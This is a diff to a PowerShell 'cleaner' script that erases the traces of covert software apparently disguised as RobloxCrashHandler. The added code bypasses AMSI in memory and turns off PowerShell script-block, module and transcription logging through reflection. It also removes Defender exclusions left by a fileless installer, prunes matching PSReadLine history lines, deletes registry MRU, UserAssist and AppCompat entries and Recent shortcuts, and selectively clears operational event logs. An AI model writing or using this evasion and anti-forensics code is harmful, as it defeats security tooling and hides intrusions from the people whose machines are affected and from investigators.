@@ -39,9 +39,40 @@ Write-Host "==========================================================" -Foregro
 Write-Host "       LOWLIFE SYSTEM CLEANER & ENVIRONMENT UNINSTALLER       " -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Cyan
 
-# Temporarily disable logging to prevent cleanup traces from being logged
-wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>$null
-wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
+# ==============================================================================
+# Stealth In-Memory PowerShell Logging & Security Bypass
+# ==============================================================================
+try {
+    # 1. Disable ScriptBlock, Module, and Transcription logging in memory for this session
+    $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
+    if ($utils) {
+        $gpoSettings = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+        if ($gpoSettings) {
+            $gpo = $gpoSettings.GetValue($null)
+            if (-not $gpo) {
+                $gpo = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
+                $gpoSettings.SetValue($null, $gpo)
+            }
+            if ($gpo) {
+                $logKeys = @("ScriptBlockLogging", "TranscriptionLogging", "ModuleLogging")
+                foreach ($lk in $logKeys) {
+                    if (-not $gpo[$lk]) {
+                        $gpo[$lk] = New-Object 'System.Collections.Generic.Dictionary[string,System.Object]'
+                    }
+                }
+                $gpo["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
+                $gpo["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0
+                $gpo["TranscriptionLogging"]["EnableTranscription"] = 0
+                $gpo["ModuleLogging"]["EnableModuleLogging"] = 0
+            }
+        }
+    }
+    # 2. Bypass AMSI in memory for this process (preventing security signature scanning logging)
+    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    if ($amsi) {
+        $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+    }
+} catch {}
 
 # Stats tracker
 $perfStats = [System.Collections.Generic.List[PSCustomObject]]::new()
@@ -195,8 +226,8 @@ Run-CleanupStep "5/9: Checking and cleaning temporary folder residues" {
     return "Removed $cleanedCount temporary file residue(s)"
 }
 
-# 6. Remove license key from registry and clean up any legacy .lowlife_* files
-Run-CleanupStep "6/9: Removing license key and legacy file remnants" {
+# 6. Remove license key, Defender exclusions, PSReadLine history, and legacy files
+Run-CleanupStep "6/9: Removing license key, Defender exclusions, PSReadLine history, and legacy file remnants" {
     $cleaned = ""
     # Remove registry key used by fileless installer
     $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
@@ -221,8 +252,62 @@ Run-CleanupStep "6/9: Removing license key and legacy file remnants" {
             $cleaned += "; Deleted legacy file: $(Split-Path $f -Leaf)"
         }
     }
+
+    # 6b. Clean up PSReadLine console command history file
+    $historyPaths = @(
+        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt",
+        "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt"
+    )
+    $prWipedCount = 0
+    foreach ($hp in $historyPaths) {
+        if (Test-Path $hp) {
+            $lines = Get-Content -Path $hp -ErrorAction SilentlyContinue
+            if ($lines) {
+                $originalCount = $lines.Count
+                # Filter out lines containing keywords
+                $filtered = $lines | Where-Object {
+                    $_ -notmatch "lowlife" -and
+                    $_ -notmatch "RobloxCrashHandler" -and
+                    $_ -notmatch "installer" -and
+                    $_ -notmatch "setup" -and
+                    $_ -notmatch "cleanup" -and
+                    $_ -notmatch "delta" -and
+                    $_ -notmatch "B332FDC6"
+                }
+                if ($filtered.Count -lt $originalCount) {
+                    $filtered | Out-File -FilePath $hp -Encoding utf8 -Force -ErrorAction SilentlyContinue
+                    $prWipedCount += ($originalCount - $filtered.Count)
+                }
+            }
+        }
+    }
+    if ($prWipedCount -gt 0) {
+        $cleaned += "; Pruned $prWipedCount line(s) from PSReadLine history"
+    }
+
+    # 6c. Clean up Windows Defender Exclusions registered by installer/setup
+    $defExWiped = 0
+    $exclusions = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
+    if ($exclusions) {
+        $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
+        $parentPath = if ($resolvedPath) { Split-Path -Parent $resolvedPath -ErrorAction SilentlyContinue } else { $null }
+        
+        foreach ($ex in $exclusions) {
+            if (($parentPath -and $ex -eq $parentPath) -or 
+                ($resolvedPath -and $ex -eq $resolvedPath) -or
+                $ex -like "*lowlife*" -or 
+                $ex -like "*RobloxCrashHandler*") {
+                Remove-MpPreference -ExclusionPath $ex -ErrorAction SilentlyContinue
+                $defExWiped++
+            }
+        }
+    }
+    if ($defExWiped -gt 0) {
+        $cleaned += "; Cleaned $defExWiped Defender exclusion(s)"
+    }
+
     if ($cleaned) { return $cleaned.TrimStart('; ') }
-    return "No license key or legacy files found"
+    return "No license key, Defender exclusions, PSReadLine history, or legacy files found"
 }
 
 # 7. Clean up Windows Prefetch (.pf) & Superfetch file traces
@@ -263,8 +348,8 @@ Run-CleanupStep "7/9: Cleaning Windows Prefetch & Superfetch traces" {
     return "Wiped $cleanedCount prefetch/superfetch trace file(s)"
 }
 
-# 8. Clean up Registry references (MuiCache, UserAssist, BAM, Task Cache, and Software keys)
-Run-CleanupStep "8/9: Cleaning Registry traces and residues" {
+# 8. Clean up Registry references and user activity residues (MuiCache, UserAssist, BAM, Task Cache, AppCompatFlags, ComDlg32, RunMRU, Recent Shortcuts)
+Run-CleanupStep "8/9: Cleaning Registry traces, MRU lists, and Recent shortcut residues" {
     $cleanedKeysCount = 0
     
     # 8a. Delete Software keys if they exist (Targeted only)
@@ -308,10 +393,6 @@ Run-CleanupStep "8/9: Cleaning Registry traces and residues" {
     }
 
     # 8c. Target UserAssist entries (ROT13 encoded values matching RobloxCrashHandler/LOWLIFE/delta/B332FDC6)
-    # RobloxCrashHandler -> EboybkPenfuUnaqyre
-    # LOWLIFE            -> YBJYVSR
-    # AM_DELTA_PATCH     -> NZ_QRYGN_CNGPU
-    # B332FDC6           -> O332SDQ6
     $userAssistPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
     if (Test-Path $userAssistPath) {
         $subKeys = Get-ChildItem -Path $userAssistPath -ErrorAction SilentlyContinue
@@ -392,17 +473,102 @@ Run-CleanupStep "8/9: Cleaning Registry traces and residues" {
         Remove-Item -Path $tempExe -Force -ErrorAction SilentlyContinue
     }
 
+    # 8g. Clean AppCompatFlags (Compatibility Assistant Store)
+    $compatPaths = @(
+        "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
+        "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
+    )
+    foreach ($cp in $compatPaths) {
+        if (Test-Path $cp) {
+            $key = Get-Item -Path $cp -ErrorAction SilentlyContinue
+            if ($key) {
+                $valueNames = $key.GetValueNames()
+                foreach ($val in $valueNames) {
+                    if ($val -like "*RobloxCrashHandler*" -or $val -like "*LOWLIFE*" -or $val -like "*delta*" -or $val -like "*B332FDC6*") {
+                        Remove-ItemProperty -Path $cp -Name $val -Force -ErrorAction SilentlyContinue
+                        $cleanedKeysCount++
+                    }
+                }
+            }
+        }
+    }
+
+    # 8h. Clean OpenSavePidlMRU, LastVisitedPidlMRU, and RecentDocs
+    $comDlgPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
+    )
+    foreach ($path in $comDlgPaths) {
+        if (Test-Path $path) {
+            $subkeys = Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue
+            $allKeys = @($path) + ($subkeys | ForEach-Object { $_.PsPath })
+            foreach ($k in $allKeys) {
+                $keyObj = Get-Item -Path $k -ErrorAction SilentlyContinue
+                if ($keyObj) {
+                    $values = $keyObj.GetValueNames()
+                    foreach ($val in $values) {
+                        if ($val -ne "MRUList") {
+                            try {
+                                $data = $keyObj.GetValue($val)
+                                $dataStr = ""
+                                if ($data -is [System.Array]) {
+                                    $dataStr = [System.Text.Encoding]::Unicode.GetString($data) + [System.Text.Encoding]::ASCII.GetString($data)
+                                } else {
+                                    $dataStr = $data.ToString()
+                                }
+                                if ($dataStr -like "*lowlife*" -or $dataStr -like "*RobloxCrashHandler*" -or $dataStr -like "*delta*" -or $dataStr -like "*B332FDC6*") {
+                                    Remove-ItemProperty -Path $k -Name $val -Force -ErrorAction SilentlyContinue
+                                    $cleanedKeysCount++
+                                }
+                            } catch {}
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    # 8i. Clean RunMRU
+    $runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    if (Test-Path $runMruPath) {
+        $runMru = Get-Item -Path $runMruPath -ErrorAction SilentlyContinue
+        if ($runMru) {
+            $valueNames = $runMru.GetValueNames()
+            foreach ($val in $valueNames) {
+                if ($val -ne "MRUList") {
+                    $data = $runMru.GetValue($val)
+                    if ($data -and ($data.ToString() -like "*lowlife*" -or $data.ToString() -like "*RobloxCrashHandler*" -or $data.ToString() -like "*setup*" -or $data.ToString() -like "*installer*" -or $data.ToString() -like "*cleanup*")) {
+                        Remove-ItemProperty -Path $runMruPath -Name $val -Force -ErrorAction SilentlyContinue
+                        $cleanedKeysCount++
+                    }
+                }
+            }
+        }
+    }
+
+    # 8j. Clean Recent Shortcuts Folder (.lnk files)
+    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
+    $recentWiped = 0
+    if (Test-Path $recentPath) {
+        $lnkFiles = Get-ChildItem -Path $recentPath -Filter "*.lnk" -ErrorAction SilentlyContinue
+        foreach ($lnk in $lnkFiles) {
+            if ($lnk.Name -like "*lowlife*" -or $lnk.Name -like "*RobloxCrashHandler*" -or $lnk.Name -like "*setup*" -or $lnk.Name -like "*installer*" -or $lnk.Name -like "*cleanup*") {
+                Remove-Item -Path $lnk.FullName -Force -ErrorAction SilentlyContinue
+                $recentWiped++
+            }
+        }
+    }
+    $script:totalCleanedFiles += $recentWiped
+
     $script:totalCleanedKeys += $cleanedKeysCount
-    return "Removed $cleanedKeysCount registry entry/entries"
+    return "Removed $cleanedKeysCount registry entry/entries and $recentWiped recent shortcut(s)"
 }
 
 # 9. Clean up Windows Event Logs (Smart Targeted Operational Trace Wiping)
 Run-CleanupStep "9/9: Executing Smart Windows Event Log Wiping" {
     $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
     
-    # Smart Targeted Cleans: Avoid wiping major logs (Security, System, Application)
-    # as doing so is highly suspicious (triggers Event ID 1102 / 104 - Log Cleared).
-    # Instead, we only clear the specific operational logs that record our script execution and task traces.
     $targetLogs = @("Microsoft-Windows-PowerShell/Operational", 
                     "Microsoft-Windows-TaskScheduler/Operational",
                     "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational")
@@ -410,14 +576,28 @@ Run-CleanupStep "9/9: Executing Smart Windows Event Log Wiping" {
     $wipedCount = 0
     foreach ($log in $targetLogs) {
         try {
-            $session.ClearLog($log)
-            $wipedCount++
+            # Smart check: only clear log if it actually contains traces
+            $hasTraces = $false
+            $events = Get-WinEvent -FilterHashtable @{LogName=$log} -MaxEvents 500 -ErrorAction SilentlyContinue
+            if ($events) {
+                foreach ($ev in $events) {
+                    $msg = $ev.Message
+                    if ($msg -and ($msg -like "*lowlife*" -or $msg -like "*RobloxCrashHandler*" -or $msg -like "*delta*" -or $msg -like "*B332FDC6*")) {
+                        $hasTraces = $true
+                        break
+                    }
+                }
+            }
+            if ($hasTraces) {
+                $session.ClearLog($log)
+                $wipedCount++
+            }
         } catch {
             # Log might be empty or locked, skip gracefully
         }
     }
     $script:totalCleanedLogs += $wipedCount
-    return "Stealth wiped $wipedCount operational trace log(s) (Preserved major logs)"
+    return "Stealth wiped $wipedCount operational trace log(s) (Preserved clean logs)"
 }
 
 # Generate and save permanent audit performance log
@@ -438,10 +618,6 @@ $formattedTable = $perfStats | Format-Table -AutoSize | Out-String
 [void]$logContent.AppendLine("  Total Execution:             $totalDurationMs ms")
 [void]$logContent.AppendLine("======================================================================")
 $logContent.ToString() | Out-File -FilePath $logPath -Encoding utf8 -Force
-
-# Re-enable PowerShell and Task Scheduler event logging
-wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational" /e:true 2>$null
-wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
 
 # Visual summary dashboard
 Write-Host "==========================================================" -ForegroundColor Green
